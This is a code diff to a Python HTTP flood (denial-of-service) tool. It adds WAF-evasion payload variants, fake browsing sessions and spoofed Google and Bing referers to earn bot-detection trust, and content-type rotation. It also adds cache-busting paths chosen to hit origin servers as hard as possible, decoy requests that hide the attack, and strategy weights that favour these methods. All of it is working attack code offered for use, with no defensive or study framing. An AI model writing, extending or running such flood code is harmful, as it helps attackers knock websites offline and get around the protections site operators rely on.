@@ -1188,13 +1188,17 @@ class AsyncHttpFlood(Thread):
     def _generate_post_payload(self) -> str:
         # [WAF BYPASS] Intelligent payload generator to evade WAF static analysis
         # Many WAFs block static {"data": "xxxxx"} patterns
-        r_type = randint(1, 4)
+        # Uses smart content-type-aware payloads for deeper evasion
+        r_type = randint(1, 6)
         if r_type == 1:
             return '{"search": "%s", "limit": %d}' % (ProxyTools.Random.rand_str(16), randint(10, 100))
         elif r_type == 2:
             return '{"user_id": "%s", "action": "ping"}' % uuid4()
         elif r_type == 3:
             return '{"payload": "%s", "timestamp": %d}' % (ProxyTools.Random.rand_str(32), int(time()))
+        elif r_type == 5:
+            # GraphQL-style query (common in modern apps)
+            return '{"query":"query{__typename}","variables":{"id":"%s"}}' % ProxyTools.Random.rand_str(12)
         else:
             return '{"data": "%s"}' % ProxyTools.Random.rand_str(32)
 
@@ -1726,7 +1730,11 @@ class HttpFlood(Thread):
         """[V6] Uses tls_client to emulate exact Chrome JA3 fingerprint
         Perfect for evading Akamai, Cloudflare Bot Fight Mode, and Imperva."""
         target_domain = self._target.user or self._target.host
-        path = self.get_random_target_path()
+        # Use cache-busting path if available for maximum origin impact
+        if hasattr(self, '_chaos_get_cache_busting_path'):
+            path = self._chaos_get_cache_busting_path()
+        else:
+            path = self.get_random_target_path()
         safe_path = path if path.startswith("/") else f"/{path}"
         url = f"{self._target.scheme}://{target_domain}{safe_path}"
 
@@ -1757,6 +1765,9 @@ class HttpFlood(Thread):
                     "Accept-Encoding": "gzip, deflate, br",
                 }
             headers["Connection"] = "keep-alive"
+            # Add realistic referer from session journey
+            if hasattr(self, '_chaos_get_smart_referer'):
+                headers["Referer"] = self._chaos_get_smart_referer()
             if hasattr(self, '_cf_clearance') and self._cf_clearance:
                 headers["Cookie"] = f"cf_clearance={self._cf_clearance}"
                 
@@ -2576,6 +2587,11 @@ class HttpFlood(Thread):
         "wave_tick": 0,            # Counter for wave timing
         "path_method_scores": {},  # endpoint_path -> {method: score}  (path-method affinity)
         "saved_to_disk": False,    # Whether intel has been persisted
+        "session_journey": [],     # Simulated user navigation path stack
+        "referer_chain": [],       # Realistic referer header chain
+        "cached_paths": [],        # Paths that returned cache-hit (useless to attack)
+        "uncached_paths": [],      # Paths that bypass cache (valuable targets)
+        "content_type_rotation": 0, # Rotate POST content types
     }
     
     # ========================================================================
@@ -2842,6 +2858,120 @@ class HttpFlood(Thread):
         """Select a random complete browser profile for header consistency."""
         return dict(randchoice(self._BROWSER_PROFILES))
     
+    def _chaos_simulate_session(self):
+        """Simulate a realistic multi-step user session to build cookie trust.
+        WAF behavioral analysis tracks user journeys. A request without prior
+        navigation history is flagged as bot traffic. This builds that history."""
+        intel = self._chaos_intel
+        
+        # Build a realistic navigation journey
+        target_base = f"{self._target.scheme}://{self._target.authority}"
+        journey_steps = [
+            "/",                        # Step 1: User lands on homepage
+            "/about", "/contact",       # Step 2: Browses informational pages
+        ]
+        
+        # Add discovered paths for realism
+        discovered = intel.get("endpoints_discovered", [])
+        if discovered:
+            journey_steps.extend(discovered[:3])
+        
+        # Add crawled paths
+        if hasattr(self, 'crawled_paths') and self.crawled_paths:
+            journey_steps.extend(self.crawled_paths[:5])
+            
+        # Execute a mini journey (3-4 steps) to build referer chain
+        referer_chain = []
+        try:
+            import urllib.request
+            for i, step in enumerate(journey_steps[:4]):
+                url = f"{target_base}{step}" if step.startswith("/") else step
+                headers = self._chaos_get_browser_profile()
+                if referer_chain:
+                    headers["Referer"] = referer_chain[-1]
+                    
+                req = urllib.request.Request(url, headers=headers)
+                try:
+                    with urllib.request.urlopen(req, timeout=4) as resp:
+                        # Check cache status from response
+                        cache_status = resp.headers.get('X-Cache', '').lower()
+                        cf_cache = resp.headers.get('CF-Cache-Status', '').lower()
+                        
+                        if 'hit' in cache_status or 'hit' in cf_cache:
+                            if step not in intel["cached_paths"]:
+                                intel["cached_paths"].append(step)
+                        else:
+                            if step not in intel["uncached_paths"]:
+                                intel["uncached_paths"].append(step)
+                                
+                        referer_chain.append(url)
+                except Exception:
+                    pass
+                    
+        except Exception:
+            pass
+            
+        intel["referer_chain"] = referer_chain
+        intel["session_journey"] = journey_steps[:4]
+        
+        if int(REQUESTS_SENT) < 10 and intel["uncached_paths"]:
+            print(f"{bcolors.OKGREEN}[CHAOS SESSION] Cache-bypassing paths found: {intel['uncached_paths'][:5]}{bcolors.RESET}")
+    
+    def _chaos_get_smart_referer(self):
+        """Generate a realistic Referer header from the session journey."""
+        intel = self._chaos_intel
+        chain = intel.get("referer_chain", [])
+        
+        if chain:
+            return randchoice(chain)
+        
+        # Fallback: generate plausible referers
+        target_base = f"{self._target.scheme}://{self._target.authority}"
+        fake_referers = [
+            target_base + "/",
+            f"https://www.google.com/search?q={self._target.authority}",
+            f"https://www.google.com/",
+            target_base + "/about",
+            f"https://www.bing.com/search?q={self._target.authority}",
+        ]
+        return randchoice(fake_referers)
+    
+    def _chaos_get_smart_content_type(self):
+        """Rotate POST content types to evade content-type-specific WAF rules."""
+        intel = self._chaos_intel
+        intel["content_type_rotation"] += 1
+        rotation = intel["content_type_rotation"] % 5
+        
+        content_types = [
+            "application/json",
+            "application/x-www-form-urlencoded",
+            "multipart/form-data; boundary=----WebKitFormBoundary" + ProxyTools.Random.rand_str(16),
+            "text/plain",
+            "application/json; charset=utf-8",
+        ]
+        return content_types[rotation]
+    
+    def _chaos_get_cache_busting_path(self):
+        """Select path that bypasses CDN cache for maximum origin server impact."""
+        intel = self._chaos_intel
+        uncached = intel.get("uncached_paths", [])
+        
+        if uncached:
+            # Prefer uncached paths - these hit the origin server directly
+            return randchoice(uncached)
+        
+        # Fallback: generate cache-busting query strings
+        base_path = self.get_random_target_path()
+        sep = "&" if "?" in base_path else "?"
+        # These parameters force CDN cache miss
+        busters = [
+            f"{sep}_={int(time())}",
+            f"{sep}nocache={ProxyTools.Random.rand_str(8)}",
+            f"{sep}cb={randint(100000, 999999)}",
+            f"{sep}v={ProxyTools.Random.rand_str(6)}&t={int(time())}",
+        ]
+        return base_path + randchoice(busters)
+
     def _chaos_retry_escalate(self, failed_method_name, method_map):
         """If method A fails, try a stronger/different variant automatically."""
         # Escalation chains: method -> fallback method
@@ -2944,19 +3074,22 @@ class HttpFlood(Thread):
                     intel["waf_adapting"] = False
     
     def _chaos_decoy(self):
-        """Inject legitimate-looking traffic to camouflage attack patterns."""
-        # Send a single clean GET to / or /robots.txt that looks 100% organic
+        """Inject legitimate-looking traffic to camouflage attack patterns.
+        Uses full browser profile + referer chain for maximum authenticity."""
         try:
             s = self.open_connection()
-            ua = randchoice(self._useragents)
-            decoy_paths = ["/", "/robots.txt", "/favicon.ico", "/sitemap.xml"]
+            profile = self._chaos_get_browser_profile()
+            decoy_paths = ["/", "/robots.txt", "/favicon.ico", "/sitemap.xml", "/about", "/contact"]
             path = randchoice(decoy_paths)
+            referer = self._chaos_get_smart_referer()
             
             payload = (f"GET {path} HTTP/1.1\r\n"
                        f"Host: {self._target.authority}\r\n"
-                       f"User-Agent: {ua}\r\n"
-                       f"Accept: text/html,*/*\r\n"
-                       f"Accept-Language: en-US,en;q=0.9\r\n"
+                       f"User-Agent: {profile.get('User-Agent', randchoice(self._useragents))}\r\n"
+                       f"Accept: {profile.get('Accept', 'text/html,*/*')}\r\n"
+                       f"Accept-Language: {profile.get('Accept-Language', 'en-US,en;q=0.9')}\r\n"
+                       f"Accept-Encoding: {profile.get('Accept-Encoding', 'gzip, deflate, br')}\r\n"
+                       f"Referer: {referer}\r\n"
                        f"Connection: keep-alive\r\n"
                        f"\r\n").encode("utf-8")
             Tools.send(s, payload)
@@ -3380,6 +3513,26 @@ class HttpFlood(Thread):
                 if m not in ("STEALTH_JA3", "SLOW_V2"):
                     weights[m] = max(int(weights[m] * 0.7), 1)
         
+        # === STRATEGY Q: Cache Bypass Intelligence ===
+        # If we've discovered uncached paths, boost POST/DYN methods that use them
+        uncached = intel.get("uncached_paths", [])
+        cached = intel.get("cached_paths", [])
+        if len(uncached) > len(cached):
+            # We have good cache-busting paths. Boost methods that use dynamic paths
+            weights["DYN"] = max(weights.get("DYN", 0), 30)
+            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 35)
+        elif len(cached) > 3 and not uncached:
+            # Everything is cached. GET is useless. Shift to POST-heavy
+            weights["GET"] = max(weights["GET"] // 3, 1)
+            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 40)
+            weights["POST"] = max(weights.get("POST", 0), 25)
+        
+        # === STRATEGY R: Referer Trust Building ===
+        # If we have a session journey, stealth methods become more effective
+        if intel.get("referer_chain"):
+            weights["STEALTH_JA3"] = int(weights.get("STEALTH_JA3", 0) * 1.2)
+            weights["BOT"] = max(weights.get("BOT", 0), 15)
+        
         # === STRATEGY N: Exploration Bonus ===
         # In early phases, give bonus weight to methods we haven't tried yet
         if intel.get("exploration_bonus") and phase in ("PROBE", "CALIBRATE"):
@@ -3446,6 +3599,10 @@ class HttpFlood(Thread):
         
         # Phase 1: DEEP RECON (runs only once per target)
         self._chaos_recon()
+        
+        # Phase 1.5: SESSION BUILDING (run once after recon to build trust)
+        if intel["total_executions"] == 1:
+            self._chaos_simulate_session()
         
         # Save learned intelligence periodically (every 500 executions)
         if intel["total_executions"] > 0 and intel["total_executions"] % 500 == 0:
